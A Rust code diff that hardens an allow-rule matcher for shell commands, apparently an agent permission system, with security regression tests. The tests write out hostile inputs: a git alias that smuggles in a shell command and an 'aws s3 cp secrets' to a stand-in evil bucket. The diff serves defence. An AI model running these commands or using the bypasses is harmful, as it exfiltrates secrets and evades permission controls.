@@ -386,6 +386,23 @@ impl BashArityDict {
 
         // Primary check: the classified prefix equals the allow-rule pattern.
         if canonical == pattern_lower {
+            // `classify` collapses unknown subcommands to the bare base
+            // (`git foo` → "git"), so a single-word pattern whose base has
+            // arity entries must only match the bare command itself:
+            // `git foo` may run a `git-foo` binary from PATH, and
+            // `git -c alias.pwn='!id' status` runs shell through the alias.
+            if !pattern_lower.contains(' ')
+                && self
+                    .entries
+                    .iter()
+                    .any(|(key, _)| key.starts_with(&format!("{pattern_lower} ")))
+            {
+                return command_tokens
+                    .iter()
+                    .filter(|t| !t.starts_with('-'))
+                    .count()
+                    == 1;
+            }
             return true;
         }
 
@@ -414,6 +431,34 @@ impl BashArityDict {
                 .iter()
                 .any(|(key, _)| key.starts_with(&format!("{base_word} ")))
         {
+            return false;
+        }
+
+        // Patterns the arity table governs must not use the unbounded
+        // plain-prefix fallback: positionals past the arity window would
+        // ride the rule (`docker compose run <svc> <cmd>` under
+        // `docker compose`). A table-key pattern keeps a fallback bounded
+        // by its arity window instead — `kubectl get` (arity 3) still
+        // covers `kubectl get pods`, whose resource slot sits inside the
+        // window. A pattern that is a strict prefix of a table key (but
+        // not a key itself) has no window: fail closed.
+        if let Some(&(_, arity)) = self
+            .entries
+            .iter()
+            .find(|(key, _)| *key == pattern_norm.as_str())
+        {
+            let positional = command_tokens
+                .iter()
+                .filter(|t| !t.starts_with('-'))
+                .count();
+            return positional <= arity as usize
+                && command_norm.starts_with(&format!("{pattern_norm} "));
+        }
+        let strict_prefix_of_key = self
+            .entries
+            .iter()
+            .any(|(key, _)| key.starts_with(&format!("{pattern_norm} ")));
+        if strict_prefix_of_key {
             return false;
         }
 
@@ -840,5 +885,31 @@ mod tests {
     #[test]
     fn ordinary_git_config_still_matches() {
         assert!(dict().allow_rule_matches("git config", "git config --global user.name Someone"));
+    }
+
+    // ── allow_rule_matches security regressions (OCR review 2026-11-03) ──────
+
+    #[test]
+    fn multiword_table_key_pattern_never_falls_back_to_plain_prefix() {
+        // `docker compose` / `aws s3` are arity-3 table keys: positionals
+        // past the arity window must not ride the plain-prefix fallback
+        // (`docker compose run <svc> <cmd>` runs an arbitrary command in
+        // the container). Inside the window the rule keeps covering its
+        // documented slot (`kubectl get pods`).
+        assert!(!dict().allow_rule_matches("docker compose", "docker compose run web whoami"));
+        assert!(!dict().allow_rule_matches("aws s3", "aws s3 cp secrets s3://evil-bucket/"));
+        assert!(dict().allow_rule_matches("kubectl get", "kubectl get pods"));
+        assert!(dict().allow_rule_matches("npm run", "npm run build"));
+    }
+
+    #[test]
+    fn bare_base_governed_by_table_rejects_unknown_subcommands() {
+        // `classify` collapses unknown subcommands to the bare base, so
+        // `git foo` (runs a `git-foo` binary from PATH) and
+        // `git -c alias.pwn='!id' status` (alias `!` values run shell) must
+        // not match the single-word pattern `git` on the primary path.
+        assert!(!dict().allow_rule_matches("git", "git foo"));
+        assert!(!dict().allow_rule_matches("git", "git -c alias.pwn='!id' status"));
+        assert!(dict().allow_rule_matches("git", "git"));
     }
 }
